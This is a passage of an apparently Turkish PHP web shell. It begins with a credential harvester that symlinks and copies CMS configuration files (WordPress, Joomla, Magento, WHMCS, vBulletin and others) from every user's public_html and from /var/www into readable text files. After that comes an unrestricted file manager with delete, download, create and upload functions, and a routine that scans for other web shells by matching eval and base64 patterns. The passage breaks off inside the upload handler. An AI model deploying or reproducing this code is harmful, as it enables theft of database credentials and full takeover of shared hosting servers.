                "/" . $home . "/" . $user . "/public_html/new/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/blogs/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/blog/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/submitticket.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/cms/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/beta/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/portal/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/site/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/main/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/home/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/demo/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/test/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/v1/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/v2/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/joomla/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/new/configuration.php",
                $user . "JOOMLA.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/app/etc/local.xml",
                $user . " MAGENTO.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/config/settings.inc.php",
                $user . " PRESTASHOP.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/application/config/database.php",
                $user . " ELLISLAB.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/admin/config.php",
                $user . " OPENCART.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/default/settings.php",
                $user . " DRUPAL.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/forum/config.php",
                $user . " PHPBB.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/application/config/database.php",
                $user . " ELLISLAB.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/admin/config.php",
                $user . " OPENCART.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/default/settings.php",
                $user . " DRUPAL.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/forum/config.php",
                $user . " PHPBB.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/vb/includes/config.php",
                $user . " VBULLETIN.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/includes/config.php",
                $user . " VBULLETIN.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/forum/includes/config.php",
                $user . " VBULLETIN.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_htm/config.php",
                $user . " OTHER.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_htm/html/config.php",
                $user . " PHPNUKE.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/vb/includes/config.php",
                $user . " VBULLETIN.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/includes/config.php",
                $user . " VBULLETIN.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/forum/includes/config.php",
                $user . " VBULLETIN.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_htm/config.php",
                $user . " OTHER.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_htm/html/config.php",
                $user . " PHPNUKE.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_htm/conn.php",
                $user . " OTHER.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/conn.php",
                $user . " OTHER.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/inc/config.inc.php",
                $user . " OTHER.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/application/config/database.php",
                $user . " OTHER.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/application/config/database.php",
                $user . " OTHER.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/inc/config.inc.php",
                $user . " OTHER.txt"
            );
            copy("/var/www/wp-config.php", "WORDPRESS.txt");
            copy("/var/www/configuration.php", "JOOMLA.txt");
            copy("/var/www/config.inc.php", "OPENJOURNAL.txt");
            copy("/var/www/config.php", "OTHER.txt");
            copy("/var/www/config/koneksi.php", "OTHER.txt");
            copy("/var/www/include/config.php", "OTHER.txt");
            copy("/var/www/connect.php", "OTHER.txt");
            copy("/var/www/config/connect.php", "OTHER.txt");
            copy("/var/www/include/connect.php", "OTHER.txt");
            copy("/var/www/html/wp-config.php", "WORDPRESS.txt");
            copy("/var/www/html/configuration.php", "JOOMLA.txt");
            copy("/var/www/html/config.inc.php", "OPENJOURNAL.txt");
            copy("/var/www/html/config.php", "OTHER.txt");
            copy("/var/www/html/config/koneksi.php", "OTHER.txt");
            copy("/var/www/html/include/config.php", "OTHER.txt");
            copy("/var/www/html/connect.php", "OTHER.txt");
            copy("/var/www/html/config/connect.php", "OTHER.txt");
            copy("/var/www/html/include/connect.php", "OTHER.txt");
            symlink("/var/www/wp-config.php", "WORDPRESS.txt");
            symlink("/var/www/configuration.php", "JOOMLA.txt");
            symlink("/var/www/config.inc.php", "OPENJOURNAL.txt");
            symlink("/var/www/config.php", "OTHER.txt");
            symlink("/var/www/config/koneksi.php", "OTHER.txt");
            symlink("/var/www/include/config.php", "OTHER.txt");
            symlink("/var/www/connect.php", "OTHER.txt");
            symlink("/var/www/config/connect.php", "OTHER.txt");
            symlink("/var/www/include/connect.php", "OTHER.txt");
            symlink("/var/www/html/wp-config.php", "WORDPRESS.txt");
            symlink("/var/www/html/configuration.php", "JOOMLA.txt");
            symlink("/var/www/html/config.inc.php", "OPENJOURNAL.txt");
            symlink("/var/www/html/config.php", "OTHER.txt");
            symlink("/var/www/html/config/koneksi.php", "OTHER.txt");
            symlink("/var/www/html/include/config.php", "OTHER.txt");
            symlink("/var/www/html/connect.php", "OTHER.txt");
            symlink("/var/www/html/config/connect.php", "OTHER.txt");
            symlink("/var/www/html/include/connect.php", "OTHER.txt");
        }
        echo '<i><b><h2 style="color:#fff;">Config için aşağı inin. </h2></b></i></center>';
    }
    ?>
				<?php
    function perms($file)
    {
        $perms = fileperms($file);
        if (($perms & 0xc000) == 0xc000) {
            // Socket
            $info = "s";
        } elseif (($perms & 0xa000) == 0xa000) {
            // Symbolic Link
            $info = "l";
        } elseif (($perms & 0x8000) == 0x8000) {
            // Regular
            $info = "-";
        } elseif (($perms & 0x6000) == 0x6000) {
            // Block special
            $info = "b";
        } elseif (($perms & 0x4000) == 0x4000) {
            // Directory
            $info = "d";
        } elseif (($perms & 0x2000) == 0x2000) {
            // Character special
            $info = "c";
        } elseif (($perms & 0x1000) == 0x1000) {
            // FIFO pipe
            $info = "p";
        } else {
            // Unknown
            $info = "u";
        } // Owner
        $info .= $perms & 0x0100 ? "r" : "-";
        $info .= $perms & 0x0080 ? "w" : "-";
        $info .=
            $perms & 0x0040
                ? ($perms & 0x0800
                    ? "s"
                    : "x")
                : ($perms & 0x0800
                    ? "S"
                    : "-"); // Group
        $info .= $perms & 0x0020 ? "r" : "-";
        $info .= $perms & 0x0010 ? "w" : "-";
        $info .=
            $perms & 0x0008
                ? ($perms & 0x0400
                    ? "s"
                    : "x")
                : ($perms & 0x0400
                    ? "S"
                    : "-"); // World
        $info .= $perms & 0x0004 ? "r" : "-";
        $info .= $perms & 0x0002 ? "w" : "-";
        $info .=
            $perms & 0x0001
                ? ($perms & 0x0200
                    ? "t"
                    : "x")
                : ($perms & 0x0200
                    ? "T"
                    : "-");
        return $info;
    }
    if (isset($_GET["path"])) {
        $path = $_GET["path"];
        chdir($path);
    } else {
        $path = getcwd();
    }
    $path = str_replace("\\", "/", $path);
    $paths = explode("/", $path);
    if (isset($_GET["dir"])) {
        $dir = $_GET["dir"];
        chdir($dir);
    } else {
        $dir = getcwd();
    }
    if (isset($_GET["path"])) {
        $path = $_GET["path"];
        chdir($path);
    } else {
        $path = getcwd();
    }
    $path = str_replace("\\", "/", $path);
    $paths = explode("/", $path);
    echo "<br/>Path : ";
    foreach ($paths as $id => $pat) {
        if ($pat == "" && $id == 0) {
            $a = true;
            echo '<a class="link" href="?dir=/">/</a>';
            continue;
        }
        if ($pat == "") {
            continue;
        }
        echo '<a class="link" href="?dir=';
        for ($i = 0; $i <= $id; $i++) {
            echo "$paths[$i]";
            if ($i != $id) {
                echo "/";
            }
        }
        echo '">' . $pat . "</a>/";
    }
    $scandir = scandir($path);
    echo "&nbsp;&nbsp;[ " . w($dir, perms($dir)) . " ]";
    echo '<center><div id="tab"><table class="btnnnnnn">
			<thead class="bg-info text-center">
				<th class="text-left">Dosyalar</th>
				<th>Boyut</th>
				<th>İzinler</th>
				<th>İşlemler</th>
			</thead>';
    foreach ($scandir as $dir) {
        /* cek jika ini berbentuk folder */ /* cek jika nama folder karaker terlalu panjang */ if (
            strlen($dir) > 18
        ) {
            $_dir = substr($dir, 0, 18) . "...";
        } else {
            $_dir = $dir;
        }
        if (!is_dir($path . "/" . $dir) || $dir == "." || $dir == "..") {
            continue;
        }
        echo '<tr>
					<td class="text-white"><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"></img> <a href="?dir=' .
            $path .
            "/" .
            $dir .
            '">' .
            $_dir .
            '</a></td>
					<td class="text-white"><center>--</center></td>
					<td class="text-white"><center>';
        if (is_writable($path . "/" . $dir)) {
            echo '<font color="#00ff00">';
        } elseif (!is_readable($path . "/" . $dir)) {
            echo '<font color="red">';
        }
        echo perms($path . "/" . $dir);
        if (
            is_writable($path . "/" . $dir) ||
            !is_readable($path . "/" . $dir)
        ) {
            echo '</font></center></td>
					<td class=""><center>
					</td>
				';
        }
    }
    foreach ($scandir as $file) {
        /* cek jika ini berbentuk file */ if (!is_file($path . "/" . $file)) {
            continue;
        }
        $size = filesize($path . "/" . $file) / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . " MB";
        } else {
            $size = $size . " KB";
        }
        echo '<tr>
						<td><img src="'; /* set image berdasarkan extensi file */
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        if ($ext == "php") {
            echo 'https://cdn-icons-png.flaticon.com/512/5968/5968332.png"';
        } elseif ($ext == "html") {
            echo 'https://cdn-icons-png.flaticon.com/512/919/919827.png"';
        } elseif ($ext == "css") {
            echo 'https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg"';
        } elseif ($ext == "png") {
            echo 'https://st2.depositphotos.com/2498595/5639/v/950/depositphotos_56399155-stock-illustration-photo-camera-ico.jpg"';
        } elseif ($ext == "jpg") {
            echo 'https://st2.depositphotos.com/2498595/5639/v/950/depositphotos_5639955-stock-illustration-photo-camera-ico.jpg"';
        } elseif ($ext == "jpeg") {
            echo 'https://st2.depositphotos.com/2498595/5639/v/950/depositphotos_5639955-stock-illustration-photo-camera-ico.jpg"';
        } elseif ($ext == "zip") {
            echo 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANQAAADtCAMAAADwdatPAAAAyVBMVEX/////AAAmJiYAAAAjIyP/YWH/dXXIyMgICAg6OjoxMTG5ubnV1dX/nZ3/7OwODg7/oaEbGxv19fXPz89YWFhMTEz/3t6xsbHs7OyoqKj/8/P/wcEAJyfDEhIVFRU3NzfRDw8sLCz/FRX/QkLj4+Pn5+dhYWFpaWmOjo6fn5//i4tISEh0dHRCQkL/UVH/lZX/2tr/jY3/uLj/KCiWlpaBgYEaNDTS3Nz/WVnPAAD/Z2f/qan/goL/0ND/5ub/IiL/srL/MzPAAAAVMe68AAAHT0lEQVR4nO3d/1/aOBgH8KzNZoFqLYii3tXDgYrI1M3deercvP//jzqcU5LQNk/zPV0+P+2Fbdo3gTZP7AxC4ExnF/OOuUSdG/i5CWZyEhc5NpgIF3hDr6kX55Hx4FirqhebJz1Hp2piyaS1r3YsfPZeVQNNptRWR0Ua++qssIfS1lc72CJKl+rIKkqTqmsXtVSl7UNpUVEonCV6U/YO4kS5ikThk57mzEtVyvuKROn4eNMhr7WrfyrvK2soPF4NZXA2UXoYa6gkHa7u+zhWqrKGWh5sTvRVoVJlE4UWmlRWUbpUdlH9DqHKp6oOYxdFqwpVKssoWoUVqWyjUL9LqkZKDmMdhfpH5PdKico+iu6rsQqVAyjUJ0dMkQKVCyg06qpVOYFCI2LMnnelVW6gaFXUlzyMIyimryRVrqDQKCdUR3IqZ1BoignVWErlDgpNlfWVQyg0zRSpXEKhSaFG5RQKTci+Wgir3EKhCTHfmXdED+MYCqUq+so1FEpjQjUXO4xzKFq1EDqMeyhKVQxFDuMgSl7lIkpa5SQKDUjVTuPDuImSVDmKQhsyKldRS1UkrHIWJdNX7qLovjppchjDqNVUWLbP3ZpUZU1UZlGnxPxel795T1BlFkU+3lWc8renVIDtf8Usai9bHS3K8WyQ1mdylouozKLox0BxEfNCPWEJVplFST4KFZ81P4oB1CyrPmWICjbNbhjVl3u6NemBjmIYhc6kugpwc3uOaZTctyqBPUlsHDWJJVSuotBkLP6AtbMohL4K/+cSh1HP/w0oE/oQuoxCaLQ/LOIkgwR7g1qmn/b2AOmRZ+g8CppFG1GdgPqZgLKSgHpJK1F//7FK/I/m8xMKg/p8+56bv4j8C9heU24PoKjNd/5kK6A8SUD5koDyJQHlSwLKlwSULwkoXxJQvuQ3Qx01Q93db0Ny/Lr9JvnqNdFQRTub1w+fjKPuKxui8oaiXn0kGqrb+3H7o1HUdkMUNTmyC0Qtc9hGFEK3bUSh921Eoe9tRH1rIwpxLu5+ojiXQGWoy62SPLKz2ldv28NQuw/n5+fX99+YZg4MoUDNEzdZGOqtSz7TDdVfKrSijpmOIgcODVHvDqnXP9hDMY1vHRM/a4r6Qr3+YA31SDd4QJoao+jWLm2hdhkT/T1ojLpyAXXFtPeF/nFjFLXDuSCqK4fimBqj3lOvi14o5FDsnWWtDmqI+k5fSJ9soA6ZxtZru0ao40u6OeGbrwyKNZWM1WCog29XV1dr4xL02QKKuf2XlnV2BrTiqB9MS6VFnZ3SQxjFTsHclW4e�2KvpPpRm0w7FVdfCVT5u6QTxVynKu8o4qj6e5QO1DXTSuXIUxS1C5j5U4x6YBq5rtxSDLXL7yblKNZUs1Nj1MHW4TXvCqED9YFpYrtmW+CI4unjS56OK1vSi7pjWriv27jxKN0O6pZp4Eft1n6gPjH7c8ZndlDjZijWxDsdH1AfG5p8QD01NfmAqm6GjUeo6oemAyqgAiqgAqr1KOrFyiderKIuN6Ep3YOc798mfwAqdHWh3EpA+ZKA8iUB5Ut+M1TURlQre6qVKMnnKGzmN0Mped7PTgLKlwSULwGjDj/w8yeR/+4AO+jJXfWMCYOCxP2/8SKAcv+v8QTUSwLKSgLqJe6jWvmXGANqfZeAMpaAWt8loIwloNZ3CShjsYjqz/ZrIvNuWUSN4pq/Dh7viTdsFxVVJwuomjNsDWrcRlQreyqg1ndxE2VxjsLZnsov0kF5NrhLIMuhNiqOOxikN+QiNAKoKK9chozbjhxqp3oBNGphHRFUVYobzagBcK0tlaiEv+qY5HdqATkNMKoDaC0HrHonidqHLSAGRO0AUDGgKUkUcK23eAJCnfFXuMIFoB3ZS/oJZEkqnINMKOW/RfmFAdQe5PNXfIWh0Jz7+QOt4yeLqt3/NfEUiJpwW4u5d14FKMCbG2XABS2X2eOoMGjVY2nUDffL3Wix9ln9In+AO68K1AbvE5MMIZ+YtwzGcV7tglzQFaBGdW8txlkMem/J9C7GeVVgi5jKj9KjovIUcjzcb9RNr+lXBrS7PKr6BICnoD766imLCShfUo+CrS1sM2lnuJ7aAQEu2WMBX3HdSNLlbW0tNabn+wybpMnwwEgmNfdqWLIT24b1TDk9w0vi2GfvJaOx6DrDz4mhdZHh9BfiqhheQpjOXHSp63hm+9RrsiO2hHwMWzveVk5FVFK//zWRC+DE6io4dn9w8bWhCsMqTsu5aaTC8cD2CYMya6DCGWyC1X54k1GEKYdO29lPr34y6i35GDTZ4Ug2QKq8Y2umQSwDgKqY+2VaFlgJT1WApnndCq/AcrF84mca1Q3aE8gvgxzM6Kha5Wr5xE9/UVWKOFw+8TMsVzldPvFTWmA5Xj7xc5qsm1wvn/hhCyw/Sg1e6ALLl1KDF7LAwpmTT+8LZFVg+VM+8bP/S5VH/pRP/PR+qvKuT+UTP88Flm/lEz+DuGj20IMXSbWVGv8DTQEioJK7CYsAAAAASUVORK5CYII="';
        } elseif ($ext == "js") {
            echo "https://thumbs.dreamstime.com/b/javascript-icon-logo-javascript-often-abbreviated-as-js-programming-language-conforms-to-ecmascript-specification-204759326.jpg";
        } elseif ($ext == "ttf") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "otf") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "txt") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "ico") {
            echo "https://st2.depositphotos.com/2498595/5639/v/950/depositphotos_56399155-stock-illustration-photo-camera-ico.jpg";
        } elseif ($ext == "conf") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "htaccess") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "sh") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "py") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "sql") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "pl") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "pdf") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "mp4") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "mp3") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "git") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } elseif ($ext == "md") {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        } else {
            echo "https://www.iconbunny.com/icons/media/catalog/product/1/7/1755.9-css-icon-iconbunny.jpg";
        }
        echo '" style="width:4%;"></img>'; /* cek jika karaker terlalu panjang */
        $_file = $file;
        echo ' <a href="?dir=' .
            $path .
            "&aksi=view&file=" .
            $path .
            "/" .
            $file .
            '">' .
            $_file .
            "</a></td>";
        if (isset($_GET["shellbull"])) {
            $urls =
                "https://" .
                $_SERVER["HTTP_HOST"] .
                "" .
                $_SERVER["SCRIPT_NAME"] .
                "";
            $filenam = basename($urls);
            if ($filenam != $_file) {
                $dosya = $_file;
                chmod($dosya, 0666);
                $metin = htmlspecialchars(file_get_contents($dosya));
                if (!empty($metin)) {
                    $b64 = substr_count($metin, "base64_decode");
                    $eval = substr_count($metin, "eval");
                    $str13 = substr_count($metin, "str_rot13");
                    $sexec = substr_count($metin, "shell_exec");
                    $gzin = substr_count($metin, "gzinflate");
                    $up = substr_count($metin, "multipart/form-data");
                    $up2 = substr_count($metin, '$_SESSION');
                    $up3 = substr_count($metin, "header");
                    $wiki = substr_count($metin, '$uoeq967');
                    $wiki2 = substr_count($metin, '$vpna644');
                    $wiki3 = substr_count($metin, '$vpna645');
                    $phpmini = substr_count($metin, "phpshelldownload.com");
                    $phpmini2 = substr_count($metin, "x67");
                    $phpmini3 = substr_count($metin, "x4c");
                    $eval1 = substr_count($metin, "'e'.'v'.'a'.'l'");
                    $eval2 = substr_count($metin, "ZXZhbA==");
                    $yeniis = substr_count($metin, 'x4c\x4f');
                    $eva1 = substr_count($metin, '"e"."v"."a"."l"');
                    $eva2 = substr_count($metin, '"ev"."a"."l"');
                    $eva3 = substr_count($metin, '"e"."va"."l"');
                    $eva4 = substr_count($metin, '"e"."v"."al"');
                    $eva5 = substr_count($metin, '"ev"."al"');
                    $eva6 = substr_count($metin, '"eva"."l"');
                    $eva7 = substr_count($metin, '"e"."val"');
                    $evall1 = substr_count($metin, "'e'.'v'.'a'.'l'");
                    $evall2 = substr_count($metin, "'ev'.'a'.'l'");
                    $evall3 = substr_count($metin, "'e'.'va'.'l'");
                    $evall4 = substr_count($metin, "'e'.'v'.'al'");
                    $evall5 = substr_count($metin, "'ev'.'al'");
                    $evall6 = substr_count($metin, "'eva'.'l'");
                    $evall7 = substr_count($metin, "'e'.'val'");
                    $evall8 = substr_count($metin, "b32mnrb23nmrb23mnrbmn32");
                    if (
                        !$eva1 == "0" or
                        !$evall8 == "0" or
                        !$eva2 == "0" or
                        !$eva3 == "0" or
                        !$eva4 == "0" or
                        !$eva5 == "0" or
                        !$eva6 == "0" or
                        !$eva7 == "0" or
                        !$evall1 == "0" or
                        !$evall2 == "0" or
                        !$evall3 == "0" or
                        !$evall4 == "0" or
                        !$evall5 == "0" or
                        !$evall6 == "0" or
                        !$evall7 == "0"
                    ) {
                        $dosyam = "toplushell1233.txt";
                        $ac = fopen($dosyam, "a");
                        fwrite($ac, $dosya . "/n");
                        fclose($ac);
                    }
                    if (!$up == "0" and $up2 == "0" and $up3 == "0") {
                        $dosyam = "toplushell1233.txt";
                        $ac = fopen($dosyam, "a");
                        fwrite($ac, $dosya . "/n");
                        fclose($ac);
                    }
                    if (
                        !$b64 == "0" or
                        !$eval == "0" or
                        !$str13 == "0" or
                        !$gzin == "0" or
                        !$sexec == "0" or
                        !$eval1 == "0" or
                        !$eval2 == "0" or
                        !$yeniis == "0"
                    ) {
                        $dosyam = "toplushell1233.txt";
                        $ac = fopen($dosyam, "a");
                        fwrite($ac, $dosya . "/n");
                        fclose($ac);
                    }
                    if (!$wiki == "0" and !$wiki2 == "0" and !$wiki3 == "0") {
                        $dosyam = "toplushell1233.txt";
                        $ac = fopen($dosyam, "a");
                        fwrite($ac, $dosya . "/n");
                        fclose($ac);
                    }
                    if (
                        !$phpmini == "0" and
                        !$phpmini2 == "0" and
                        !$phpmini3 == "0"
                    ) {
                        $dosyam = "toplushell1233.txt";
                        $ac = fopen($dosyam, "a");
                        fwrite($ac, $dosya . "/n");
                        fclose($ac);
                    }
                } else {
                    copy($dosya, "kont.txt");
                    $dosyaAc = fOpen("kont.txt", "r");
                    $metin = fRead($dosyaAc, fileSize("kont.txt"));
                    if (!empty($metin)) {
                        $b64 = substr_count($metin, "base64_decode");
                        $eval = substr_count($metin, "eval");
                        $str13 = substr_count($metin, "str_rot13");
                        $sexec = substr_count($metin, "shell_exec");
                        $gzin = substr_count($metin, "gzinflate");
                        $up = substr_count($metin, "multipart/form-data");
                        $up2 = substr_count($metin, '$_SESSION');
                        $up3 = substr_count($metin, "header");
                        $wiki = substr_count($metin, '$uoeq967');
                        $wiki2 = substr_count($metin, '$vpna644');
                        $wiki3 = substr_count($metin, '$vpna645');
                        $phpmini = substr_count($metin, "phpshelldownload.com");
                        $phpmini2 = substr_count($metin, "x67");
                        $phpmini3 = substr_count($metin, "x4c");
                        $eval1 = substr_count($metin, "'e'.'v'.'a'.'l'");
                        $eval2 = substr_count($metin, "ZXZhbA==");
                        $yeniis = substr_count($metin, 'x4c\x4f');
                        $eva1 = substr_count($metin, '"e"."v"."a"."l"');
                        $eva2 = substr_count($metin, '"ev"."a"."l"');
                        $eva3 = substr_count($metin, '"e"."va"."l"');
                        $eva4 = substr_count($metin, '"e"."v"."al"');
                        $eva5 = substr_count($metin, '"ev"."al"');
                        $eva6 = substr_count($metin, '"eva"."l"');
                        $eva7 = substr_count($metin, '"e"."val"');
                        $evall1 = substr_count($metin, "'e'.'v'.'a'.'l'");
                        $evall2 = substr_count($metin, "'ev'.'a'.'l'");
                        $evall3 = substr_count($metin, "'e'.'va'.'l'");
                        $evall4 = substr_count($metin, "'e'.'v'.'al'");
                        $evall5 = substr_count($metin, "'ev'.'al'");
                        $evall6 = substr_count($metin, "'eva'.'l'");
                        $evall7 = substr_count($metin, "'e'.'val'");
                        if (
                            !$eva1 == "0" or
                            !$eva2 == "0" or
                            !$eva3 == "0" or
                            !$eva4 == "0" or
                            !$eva5 == "0" or
                            !$eva6 == "0" or
                            !$eva7 == "0" or
                            !$evall1 == "0" or
                            !$evall2 == "0" or
                            !$evall3 == "0" or
                            !$evall4 == "0" or
                            !$evall5 == "0" or
                            !$evall6 == "0" or
                            !$evall7 == "0"
                        ) {
                            $dosyam = "toplushell1233.txt";
                            $ac = fopen($dosyam, "a");
                            fwrite($ac, $dosya . "/n");
                            fclose($ac);
                        }
                        if (!$up == "0" and $up2 == "0" and $up3 == "0") {
                            $dosyam = "toplushell1233.txt";
                            $ac = fopen($dosyam, "a");
                            fwrite($ac, $dosya . "/n");
                            fclose($ac);
                        }
                        if (
                            !$b64 == "0" or
                            !$eval == "0" or
                            !$str13 == "0" or
                            !$gzin == "0" or
                            !$sexec == "0" or
                            !$eval1 == "0" or
                            !$eval2 == "0" or
                            !$yeniis == "0"
                        ) {
                            $dosyam = "toplushell1233.txt";
                            $ac = fopen($dosyam, "a");
                            fwrite($ac, $dosya . "/n");
                            fclose($ac);
                        }
                        if (
                            !$wiki == "0" and
                            !$wiki2 == "0" and
                            !$wiki3 == "0"
                        ) {
                            $dosyam = "toplushell1233.txt";
                            $ac = fopen($dosyam, "a");
                            fwrite($ac, $dosya . "/n");
                            fclose($ac);
                        }
                        if (
                            !$phpmini == "0" and
                            !$phpmini2 == "0" and
                            !$phpmini3 == "0"
                        ) {
                            $dosyam = "toplushell1233.txt";
                            $ac = fopen($dosyam, "a");
                            fwrite($ac, $dosya . "/n");
                            fclose($ac);
                        }
                        fClose($dosyaAc);
                        unlink("kont.txt");
                    }
                }
            }
            header("Location:" . $urlaaa);
        }
        echo '
					<td class="text-center d-flex">' .
            $size .
            '</td>
					<td><center>';
        if (is_writable($path . "/" . $file)) {
            echo '<font color="#00ff00">';
        } elseif (!is_readable($path . "/" . $file)) {
            echo '<font color="red">';
        }
        echo perms($path . "/" . $file);
        if (
            is_writable($path . "/" . $file) ||
            !is_readable($path . "/" . $file)
        ) {
            echo '</font>
					<td class="text-center d-flex">
						
												
						<a class="badge badge-danger" href="?sil=' .
                $path .
                "/" .
                $file .
                '">| Sil |</a>
						<a class="badge badge-primary" href="?indir=' .
                $path .
                "/" .
                $file .
                '">| İndir |</a>
					</td>
				</tr>';
        }
    }
    ?>
				</table>
				</div>
				<hr />

				<br>
				<center>
					<div class="btnnnnnn" style="width:25%;">
						<center>
							<form class="btnnnnnn" action="<?php echo $self .
           "?klasorolustur"; ?>" method="GET">
								<p>
									<font color='#fff' size="5"><b>Klasör Oluştur</b></font>
								</p>
								<input type="text" name="klasorolustur1" />
								<?php if (isset($_GET["dir"])) {
            echo '<input type="hidden" name="yol" value="' .
                $_GET["dir"] .
                '">';
        } ?>
								<p><button style='width:15%;height:5%; background:transparent;' type="submit" name="klasorolustur" /><img src="https://img.icons8.com/fluency/344/ok.png" width="80%"></button></p>
							</form>
						</center>

						<center>
							<form class="btnnnnnn" action="<?php echo $self .
           "?dosyaolustur"; ?>" method="GET">
								<p>
									<font color='#fff' size="5"><b>Dosya Oluştur</b></font>
								</p>
								<input type="text" name="dosyaolustur1" />
								<?php if (isset($_GET["dir"])) {
            echo '<input type="hidden" name="yol" value="' .
                $_GET["dir"] .
                '">';
        } ?>

								<p><button style='width:15%;height:5%; background:transparent;' type="submit" name="dosyaolustur" /><img src="https://img.icons8.com/fluency/344/ok.png" width="80%"></button></p>
							</form>
						</center><br>

						<center>


							<form class="btnnnnnn" action="" method="POST" enctype="multipart/form-data">
								<p>
									<font color='#fff' size="5"><b>Dosya Yükle</b></font>
								</p>
								<input type="file" name="file"><br>
								<?php if (isset($_GET["dir"])) {
            echo '<input type="hidden" name="yol" value="' .
                $_GET["dir"] .
                '">';
        } ?>
								<br><button style='width:5%;height:5%; background:transparent;' type="submit" name="yukle"><img src="https://img.icons8.com/fluency/344/ok.png" width="80%"></button><br>
							</form>
						</center>
					</div>
				</center><br>

				<?php if (isset($_POST["yukle"])) {
        $gecici_yol = $_FILES["file"]["tmp_name"];
        $dosya_adi = basename($_FILES["file"]["name"]);
        if (!empty($_POST["yol"])) {
            $yol2 = $_POST["yol"];
            $yola = $yol2 . "/" . $dosya_adi;
